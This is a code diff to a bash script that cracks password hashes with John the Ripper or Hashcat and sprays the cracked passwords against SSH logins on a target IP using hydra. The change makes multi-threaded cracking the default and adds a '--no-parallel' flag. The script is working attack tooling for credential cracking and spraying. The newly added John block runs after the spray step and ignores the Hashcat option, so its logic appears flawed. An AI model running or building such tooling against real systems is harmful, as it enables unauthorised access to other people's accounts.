@@ -11,7 +11,7 @@ usage() {
     echo "  -f  (Optional) File containing multiple hashes"
     echo "  -t  (Optional) Target IP for credential spraying"
     echo "  --hashcat  Use Hashcat instead of John for GPU cracking"
-    echo "  --parallel  Use multi-threading for faster cracking"
+    echo "  --no-parallel  Disable multi-threading (default: enabled)"
     echo "  --spray <userlist>  Perform credential spraying with cracked passwords"
     exit 1
 }
@@ -28,13 +28,14 @@ check_tools() {
 
 # Parse command-line arguments
 SPRAY_MODE=0
+USE_PARALLEL=1  # Enabled by default
 while [[ "$#" -gt 0 ]]; do
     case $1 in
         -h) HASH_INPUT="$2"; shift ;;
         -w) WORDLIST="$2"; shift ;;
         -f) HASH_FILE="$2"; shift ;;
         --hashcat) USE_HASHCAT=1 ;;
-        --parallel) USE_PARALLEL=1 ;;
+        --no-parallel) USE_PARALLEL=0 ;;
         --spray) SPRAY_MODE=1; USERLIST="$2"; shift ;;
         -t) TARGET_IP="$2"; shift ;;  # <-- Added target IP argument
         *) usage ;;
@@ -101,4 +102,13 @@ if [[ $SPRAY_MODE -eq 1 ]]; then
         echo "[*] Testing password: $pass against SSH login at $TARGET_IP..."
         hydra -L "$USERLIST" -p "$pass" ssh://$TARGET_IP
     done
+fi
+
+# Enable parallel processing unless disabled by the user
+if [[ $USE_PARALLEL -eq 1 ]]; then
+    CORES=$(nproc)
+    echo "[*] Running John with $CORES threads..."
+    john --wordlist="$WORDLIST" --fork=$CORES --format="$JOHN_FORMAT" "$HASH_FILE"
+else
+    john --wordlist="$WORDLIST" --format="$JOHN_FORMAT" "$HASH_FILE"
 fi
